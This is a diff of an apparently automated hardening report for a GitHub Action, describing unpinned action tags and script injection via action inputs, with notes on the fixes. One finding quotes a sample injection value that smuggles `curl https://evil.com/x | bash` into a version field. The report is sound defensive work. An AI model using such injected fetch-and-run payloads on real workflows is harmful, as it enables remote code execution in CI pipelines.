@@ -16,24 +16,24 @@ Action **1sgtpepper--scieqlint/v1.1.0** was hardened automatically. 4 finding(s)
 
 ### unpinned-uses (severity: high)
 
-action.yml references `actions/setup-python@v6` using a mutable tag (`@v6`) rather than a pinned 40-character commit SHA. This means the action could be silently updated to a different (potentially malicious) version without any change to this file.
+The action uses `actions/setup-python@v6`, which is pinned to a mutable version tag rather than a full 40-character commit SHA. A tag can be moved to point to a different (potentially malicious) commit, enabling supply-chain attacks. It should be pinned to a specific SHA, e.g. `actions/setup-python@<40-char-sha> # v6`.
 
 Locations:
 
-- `action.yml:20`
+- `action.yml:22`
 
 ### script-injection (severity: high)
 
-Two `run:` blocks in action.yml directly interpolate `inputs.*` expressions into shell commands (sub-rule a), enabling script injection by any caller who controls those inputs.
+Sub-rule (a): Two `run:` steps directly interpolate GitHub Actions expressions into shell command strings without routing through env vars, allowing an attacker to inject arbitrary shell commands via the action inputs.
 
-1. Line 24: `python -m pip install "scieqlint==${{ inputs.package-version }}"` — an attacker-supplied `package-version` value (e.g. `1.0.0"; malicious_cmd #`) is expanded by the Actions template engine before the shell sees it, allowing arbitrary command execution.
+1. `run: python -m pip install "scieqlint==${{ inputs.package-version }}"` — `${{ inputs.package-version }}` is expanded by the template engine before the shell sees it. A value like `1.0.0" && curl https://evil.com/x | bash #` would execute arbitrary code.
 
-2. Line 27: `scieqlint ${{ inputs.args }}` — an attacker-supplied `args` value is expanded directly into the shell command line, allowing arbitrary command execution.
+2. `run: scieqlint ${{ inputs.args }}` — `${{ inputs.args }}` is expanded directly into the shell command. Any shell metacharacters in the input (`;`, `|`, `&&`, `$(...)`, etc.) will be interpreted by the shell. The fix is to pass these values via `env:` variables and reference them as quoted shell variables: `"$PACKAGE_VERSION"` and `"$ARGS"`.
 
 Locations:
 
-- `action.yml:24`
-- `action.yml:27`
+- `action.yml:26`
+- `action.yml:29`
 
 ### static-inline-injection (severity: high)
 
@@ -59,8 +59,8 @@ Locations:
 
 **Notes:**
 
-Fixed all four findings in action.yml:
-1. Pinned `actions/setup-python@v6` to full commit SHA `ece7cb06caefa5fff74198d8649806c4678c61a1` with `# v6` comment.
-2. Moved `${{ inputs.package-version }}` to an `env:` block as `PACKAGE_VERSION` and referenced it as `$PACKAGE_VERSION` in the pip install command.
-3. Moved `${{ inputs.args }}` to an `env:` block as `INPUT_ARGS` and used xargs-based tokenization into a bash array (`args=()`) to properly handle multi-word/quoted arguments while preventing shell injection. The guard `if [ -n "$INPUT_ARGS" ]` prevents xargs from emitting an empty argument when the input is empty.
+Fixed three categories of findings in hardened/action/action.yml:
+1. Pinned `actions/setup-python@v6` to full commit SHA `ece7cb06caefa5fff74198d8649806c4678c61a1` (keeping `# v6` comment for readability).
+2. Moved `${{ inputs.package-version }}` into an `env:` block as `PACKAGE_VERSION` and referenced it as `"$PACKAGE_VERSION"` in the pip install command.
+3. Moved `${{ inputs.args }}` into an `env:` block as `INPUT_ARGS` and used xargs-based tokenization into a bash array (`args=()`) to properly split the argument list while preserving quoted sub-arguments and preventing shell injection.
 
